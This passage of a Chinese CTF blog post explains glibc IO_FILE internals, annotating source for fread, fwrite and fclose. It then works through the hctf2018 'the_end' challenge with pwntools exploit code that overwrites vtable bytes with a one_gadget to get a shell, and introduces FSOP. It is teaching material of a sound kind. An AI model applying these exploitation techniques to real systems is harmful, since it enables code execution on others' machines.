_IO_link_in (fp);         <span class="comment">// 调用 _IO_link_in 函数将 fp 放进链表</span></span><br><span class="line">    fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">        _IO_lock_lock (list_all_lock);</span><br><span class="line">        run_fp = (_IO_FILE *) fp;</span><br><span class="line">        _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;  <span class="comment">// fp 放到链表头部</span></span><br><span class="line">        _IO_list_all = fp;                            <span class="comment">// 链表头 _IO_list_all 指向 fp</span></span><br><span class="line">        ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line">        _IO_lock_unlock (list_all_lock);</span><br><span class="line">        _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fread()</code>   最终会调用  <code>_IO_fiel_xsgetn</code> <ul>
<li>流程大致为 <code>_IO_fread-&gt;_IO_sgetn-&gt;_IO_XSGETN-&gt;_IO_file_xsgetn</code>。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fread</span></span><br><span class="line"><span class="comment">// libio/iofread.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 存放读取数据的缓冲区。</span></span><br><span class="line"><span class="comment">* size: 指定每个记录的长度。</span></span><br><span class="line"><span class="comment">* count: 指定记录的个数。</span></span><br><span class="line"><span class="comment">* stream: 目标文件流。</span></span><br><span class="line"><span class="comment">* 返回值: 返回读取到数据缓冲区中的记录个数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t bytes_requested = size * count;</span><br><span class="line">    _IO_size_t bytes_read;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);   <span class="comment">// 调用 _IO_sgetn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_XSGETN (fp, data, n);          <span class="comment">// 调用宏 _IO_XSGETN</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">	_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">	(*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset))</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fwrite</code> 最终会调用 <code>_IO_file_xsputn</code><ul>
<li>流程 <code>_IO_fwrite-&gt;_IO_XSPUTN-&gt;_IO_new_file_xsputn-&gt;_IO_OVERFLOW-&gt;_IO_new_file_overflow</code></li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fwrite()</span></span><br><span class="line"><span class="comment">// libio/iofwrite.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 是一个指针，对 fwrite 来说，是要写入数据的地址;</span></span><br><span class="line"><span class="comment">* size: 要写入内容的单字节数;</span></span><br><span class="line"><span class="comment">* count: 要进行写入 size 字节的数据项的个数;</span></span><br><span class="line"><span class="comment">* stream: 目标文件指针;</span></span><br><span class="line"><span class="comment">* 返回值: 实际写入的数据项个数 count。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t request = size * count;</span><br><span class="line">    _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">        written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);      <span class="comment">// 调用 _IO_sputn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">       this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">       simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">       buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">    <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fclose</code> 最终会调用 <code>_IO_file_finish</code><ul>
<li>流程大致如下<ul>
<li><code>_IO_unlink_it</code> 将指定的 <code>FILE</code> 从 <code>_chain</code> 链表中摘除</li>
<li><code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件</li>
<li><code>_IO_FINISH-&gt;_IO_file_finish</code> 会调用 <code>free</code> 函数释放 <code>FILE</code> 结构</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libio/iofclose.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span>(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">    <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">       strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">       here.  */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);  <span class="comment">// 将 fp 从链表中取出</span></span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        status = _IO_file_close_it (fp);            <span class="comment">// 关闭目标文件</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    _IO_FINISH (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">         <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cc = fp-&gt;_codecvt;</span><br><span class="line">         __libc_lock_lock (__gconv_lock);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">         __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">              _IO_free_backup_area (fp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">      &#123;</span><br><span class="line">          fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">free</span>(fp);                                 <span class="comment">// 释放 FILE 结构体</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="getshell-一般条件"><a href="#getshell-一般条件" class="headerlink" title="getshell 一般条件"></a>getshell 一般条件</h2><p>必须要 <code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。在 <code>fflush</code> 函数的检查里，它第二步才是跳转，第一步的检查，在 <code>arena</code> 里的伪造 <code>file</code> 结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会 <code>check</code> 失效。</p>
<h2 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="[hctf2018]the_end"></a><a class="link"   href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end" >[hctf2018]the_end <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195448855.png"
                      alt="image-20231018195448855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203336478.png"
                      alt="image-20231017203336478"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203259746.png"
                      alt="image-20231017203259746"
                ></p>
<h3 id="试运行"><a href="#试运行" class="headerlink" title="试运行"></a>试运行</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203439647.png"
                      alt="image-20231017203439647"
                ></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">    <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们有五次任意地址写 <code>1</code> 字节的机会，并且给了我们 <code>sleep()</code> 函数的地址。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>glibc-2.23</code> 版本及之前没有 <code>_IO_vtable_check</code> 检查，因此可以伪造 <code>vtable</code> 劫持程序流程。 <code>exit</code> 函数有一条这样的调用链 <code>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_unbuffer_all-&gt;_IO_SETBUFF(fp, NULL, 0)</code>，这里调用了 <code>_IO_2_1_stdout_</code> 的<code>vatable</code> 中 <code>_setbuf</code> 函数.。但位于 <code>libc</code> 数据段的 <code>vtable</code> 是不可以进行写入的，因为 <code>_IO_jumps_t</code> 的第 <code>11</code> 位是 <code>    JUMP_FIELD(_IO_setbuf_t, __setbuf);</code> 所以我们可以在其附近寻找 <code>fake_vtable</code> 将其 <code>(11*8)0x58</code>  处改为 <code>one_gadget</code> ，当程序退出调用 <code>exit</code> 时将会调用 <code>one_gadget</code> 从而 <code>getshell</code> 。</p>
<p><strong>获取信息</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    <span class="keyword">global</span> one_gadget, stdout_vtable, fake_vtable, stderr_vtable</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;here is a gift &quot;</span>)</span><br><span class="line">    sleep = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;luck ;)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = sleep - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0xf03a4</span></span><br><span class="line"></span><br><span class="line">    stdout_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    stderr_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    fake_vtable = stderr_vtable - <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;libc_base : 0x%x&quot;</span> % libc.address)</span><br><span class="line">    info(<span class="string">&quot;one_gadget : 0x%x&quot;</span> % one_gadget)</span><br><span class="line">    info(<span class="string">&quot;stdout_vtable : 0x%x&quot;</span> % stdout_vtable)</span><br><span class="line">    info(<span class="string">&quot;fake_vtable : 0x%x&quot;</span> % fake_vtable)</span><br><span class="line">    info(<span class="string">&quot;stderr_vtable : 0x%x&quot;</span> % stderr_vtable)</span><br><span class="line"></span><br><span class="line">    debug()</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160216214.png"
                      alt="image-20231018160216214"
                ></p>
<p><code>libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0xd8</code> 是 <code>_IO_2_1_stdout_</code> 的 <code>vtable</code> 指针，<code>glibc-2.23</code>版本<code>x64</code> 的偏移<code>(struct _IO_FILE大小)</code>为 <code>0xd8</code>，<code>x32</code> 减半。</p>
<p><strong>get_shell</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">    p.send(p64(stdout_vtable))</span><br><span class="line">    p.send(p8(fake_vtable&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stdout_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((fake_vtable&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    p.send(p64(stderr_vtable))</span><br><span class="line">    p.send(p8(one_gadget&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">2</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">b&quot;exec 1&gt;&amp;0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160251059.png"
                      alt="image-20231018160251059"
                ></p>
<p>前两次机会我们可以修改 <code>stdout_vtable</code> 的后 <code>16</code> 位将其指向 <code>fake_vtable</code> 。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160327303.png"
                      alt="image-20231018160327303"
                ></p>
<p>后面三次机会将 <code>fake_vtable</code> 的高 <code>11*8(0x58)</code> 处的 <code>_IO_SETBUF(实际上是 stderr_vtable)</code> 改为 <code>onegadget</code>，因为都在 <code>libc.so</code> 数据段，所以我们只需要修改其后 <code>8*3</code> 位即可。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160457056.png"
                      alt="image-20231018160457056"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160514870.png"
                      alt="image-20231018160514870"
                ></p>
<p>最后调用了 <code>one_gadget</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160702397.png"
                      alt="image-20231018160702397"
                ></p>
<p>但是我这里<code>4</code>  个 <code>one_gadget</code> 都不满足条件，这个方法没打通，哪里有问题还想烦请师傅多多指教。</p>
<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hctf2018the_end.png"
                      alt="hctf2018the_end"
                ></p>
<h2 id="FSOP-glibc"><a href="#FSOP-glibc" class="headerlink" title="FSOP(glibc &lt;&#x3D; 2.23)"></a>FSOP(glibc &lt;&#x3D; 2.23)</h2><p><code>FSOP</code> 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。<code>FSOP</code> 通过伪造 <code>_IO_jump_t</code> 中的 <code>__overflow</code> 为 <code>system()</code> 函数 地 址 ， 最 终 在 <code>_IO_OVERFLOW(fp,EOF)</code> 函 数 中 执 行 <code>system(&#39;/bin/sh&#39;)</code> 并获得 <code>shell</code>。</p>
<ul>
<li><p><code>_IO_flush_all_lockp</code> 在一些情况下这个函数会被系统调用：</p>
<ol>
<li>当 <code>libc</code> 执行 <code>abort</code> 流程时</li>
</ol>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">abort</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">  	<span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	++stage;</span><br><span class="line">      	__fcloseall ();</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>当执行 <code>exit</code> 函数时</li>
</ol>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span> <span class="params">(<span class="type">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">1</span>)条链</span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_exit (status);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_exit (<span class="type">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  status &amp;= <span class="number">0xff</span>;</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">2</span>)条链</span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li><p>当执行流从 <code>main</code> 函数返回时会执行 <code>exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191511939.png"
                      alt="image-20231018191511939"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191606707.png"
                      alt="image-20231018191606707"
                ></p>
</li>
</ol>
</li>
<li><p><code>_IO_flush_all_lockp (int do_lock)</code> 函数需要绕过的检查。</p>
</li>
</ul>
